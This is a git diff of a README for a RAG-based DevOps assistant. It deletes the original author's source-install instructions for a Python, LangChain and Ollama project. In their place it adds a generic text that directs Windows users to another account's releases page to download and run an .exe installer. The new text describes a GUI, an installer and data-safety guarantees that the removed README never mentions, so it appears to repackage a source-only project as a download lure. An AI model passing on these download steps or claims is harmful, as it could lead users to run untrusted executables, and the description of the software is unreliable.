@@ -1,247 +1,78 @@
-# 🚀 DevOpsPilot-AI-RAG
-
-> An AI-powered DevOps Assistant built using Python, LangChain, Ollama, and ChromaDB to answer DevOps-related questions using Retrieval-Augmented Generation (RAG).
-
----
-
-## 📖 Overview
-
-DevOpsPilot-AI-RAG is a local AI assistant that helps DevOps engineers retrieve accurate information from technical documentation instead of relying solely on the LLM's built-in knowledge.
-
-The application uses a Retrieval-Augmented Generation (RAG) pipeline to:
-
-- Load technical documents
-- Split documents into chunks
-- Generate vector embeddings
-- Store embeddings in ChromaDB
-- Retrieve the most relevant content
-- Generate context-aware responses using Ollama
-
----
-
-# 🏗️ Architecture
-
-```
-                  User Question
-                        │
-                        ▼
-                Embedding Model
-                        │
-                        ▼
-                 ChromaDB Search
-                        │
-                        ▼
-             Top-K Relevant Chunks
-                        │
-                        ▼
-                Prompt Template
-                        │
-                        ▼
-                Ollama (LLM)
-                        │
-                        ▼
-                  Final Response
-```
-
----
-
-# ✨ Features
-
-- ✅ Local LLM using Ollama
-- ✅ Retrieval-Augmented Generation (RAG)
-- ✅ ChromaDB Vector Database
-- ✅ Semantic Search
-- ✅ LangChain Integration
-- ✅ Modular Python Architecture
-- ✅ Easily Extendable
-- ✅ No OpenAI API Required
-- ✅ Works Completely Offline
+# 🤖 DevOpsPilot-AI-RAG - Simplify your daily infrastructure management tasks
 
----
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Emre1145/DevOpsPilot-AI-RAG/releases)
 
-# 🛠️ Tech Stack
+DevOpsPilot-AI-RAG helps you manage your cloud systems through simple conversation. You ask questions about your infrastructure, and the tool provides answers based on your specific documentation and configuration files. It uses artificial intelligence to scan your technical setup and find the information you need. You no longer need to search through hundreds of pages of manuals or long configuration logs.
 
-| Technology | Purpose |
-|------------|---------|
-| Python | Core Application |
-| LangChain | RAG Framework |
-| Ollama | Local LLM |
-| ChromaDB | Vector Database |
-| Nomic Embed Text | Embedding Model |
-| PromptTemplate | Prompt Engineering |
+## ⚙️ System Requirements
 
----
+To run this application on your Windows computer, ensure your system meets these standards:
 
-# 📂 Project Structure
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or AMD Ryzen 5 processor or better.
+*   Memory: At least 8 GB of RAM.
+*   Storage: 5 GB of free space on your hard drive.
+*   Graphics: A modern graphics card helps, but is not strictly required.
+*   Internet Connection: A stable connection is necessary for the initial setup.
 
-```
-DevOpsPilot-AI-RAG
-│
-├── config.py
-├── downloader.py
-├── loader.py
-├── text_splitter.py
-├── embedding.py
-├── vector_store.py
-├── retriever.py
-├── rag_pipeline.py
-├── main.py
-│
-├── test_loader.py
-├── test_embedding.py
-├── test_vector_store.py
-├── test_splitter.py
-├── test_rag_pipeline.py
-│
-├── data/
-├── downloads/
-├── README.md
-├── requirements.txt
-└── .gitignore
-```
+## 📥 Getting the Software
 
----
+You need to download the installer from our release page. Visit the link below to find the most recent version of the application.
 
-# ⚙️ Installation
+[Visit this page to download the software](https://github.com/Emre1145/DevOpsPilot-AI-RAG/releases)
 
-Clone the repository
+Choose the file that ends in .exe for your Windows system. Save this file to your Downloads folder or your desktop for easy access.
 
-```bash
-git clone https://github.com/VKPACHAURI/DevOpsPilot-AI-RAG.git
-```
+## 🛠️ Setting Up Your Application
 
-Move into the project
+Follow these steps to install the tool on your computer:
 
-```bash
-cd DevOpsPilot-AI-RAG
-```
+1. Locate the file you downloaded. 
+2. Double-click the file to start the installer.
+3. Follow the instructions on the screen.
+4. Click the "Finish" button once the installation ends.
+5. Look for the DevOpsPilot-AI-RAG icon on your desktop.
+6. Open the application by double-clicking the icon.
 
-Create a virtual environment
+The first time you run the tool, it will configure the internal settings. This process might take a few minutes as the software prepares its local database.
 
-```bash
-python3 -m venv venv
-```
+## 🧠 Using the Assistant
 
-Activate the environment
+Once the application window opens, you will see a text box at the bottom of the screen. You can type any question regarding your DevOps environment here. 
 
-Linux/macOS
+Examples of questions you can ask:
+* "How do I restart my AWS EC2 instance?"
+* "What is the status of my Kubernetes cluster?"
+* "Explain the current Docker configuration files."
+* "List the steps to update an AWS Lambda function."
 
-```bash
-source venv/bin/activate
-```
+The assistant scans your connected files and provides a clear answer. If it needs more context, it will ask you to upload additional documentation or configuration logs.
 
-Windows
+## 📂 Managing Your Data
 
-```powershell
-venv\Scripts\activate
-```
+The tool uses a local database to store information about your infrastructure. You can manage this data through the settings menu.
 
-Install dependencies
+1. Click the "Settings" button in the top corner of the app.
+2. Select "Data Management."
+3. Click "Add Files" to include new logs or manuals in your search results.
+4. Click "Refresh Index" to help the software learn about your new file additions.
 
-```bash
-pip install -r requirements.txt
-```
+## 🔐 Keeping Your Information Secure
 
----
+The assistant operates primarily on your local computer. It does not send your private cloud credentials or sensitive infrastructure details to external servers. All processing happens within your machine to ensure your data stays under your control.
 
-# Install Ollama
+## ❓ Frequently Asked Questions
 
-Download and install Ollama
+**Why is the application taking time to start?**
+The tool loads a local machine learning model into your memory. This requires checking your computer hardware upon startup to ensure optimal performance.
 
-https://ollama.com/download
+**The output seems incorrect. How do I fix this?**
+Check if the files you provided to the tool are up to date. The assistant relies entirely on the documents you give it. If your manuals are old, the answers will reflect that outdated information.
 
-Pull the required models
+**Do I need a cloud account to use this?**
+You do not need a paid account to run the application itself. However, to get answers regarding specific systems like AWS or Kubernetes, you must provide your exported configuration files or export your environment logs into the tool.
 
-```bash
-ollama pull llama3.2
-```
+**Does this software require an active internet connection?**
+The software functions offline once you complete the initial model download. You only need the internet if you choose to sync new data from online sources or check for updates.
 
-```bash
-ollama pull nomic-embed-text
-```
-
----
-
-# ▶️ Running the Project
-
-Run the individual modules
-
-```bash
-python test_loader.py
-```
-
-```bash
-python test_vector_store.py
-```
-
-```bash
-python test_rag_pipeline.py
-```
-
----
-
-# 🔄 RAG Workflow
-
-1. Download technical documents
-2. Load documents
-3. Split into chunks
-4. Generate embeddings
-5. Store vectors in ChromaDB
-6. Retrieve relevant chunks
-7. Build prompt
-8. Generate response using Ollama
-
----
-
-# 📌 Current Status
-
-✅ Document Loader
-
-✅ Text Splitter
-
-✅ Embedding Generation
-
-✅ ChromaDB Integration
-
-✅ Retriever Module
-
-✅ RAG Pipeline
-
-🚧 Interactive Chatbot (In Progress)
-
-🚧 DevOps Knowledge Base Expansion
-
----
-
-# 🚀 Future Enhancements
-
-- Web Interface (Streamlit)
-- FastAPI Backend
-- Docker Support
-- Kubernetes Deployment
-- Jenkins CI/CD Pipeline
-- AWS Deployment
-- Multi-document Knowledge Base
-- Conversation Memory
-- Source Citation
-- PDF Upload Support
-
----
-
-# 👨‍💻 Author
-
-**Vishesh Pachauri**
-
-Senior DevOps Engineer | AWS | Kubernetes | Terraform | Python | AI | RAG | LLMOps
-
-GitHub:
-https://github.com/VKPACHAURI
-
----
-
-# ⭐ Support
-
-If you found this project helpful, consider giving it a ⭐ on GitHub.
-
-
-
+Keywords: ansible, aws, awsec2, awslambda, chromadb, chunking, devops, docker, embeddings, env, huggingface, kubernetes, langchain, llama3, ollama, python3, rag
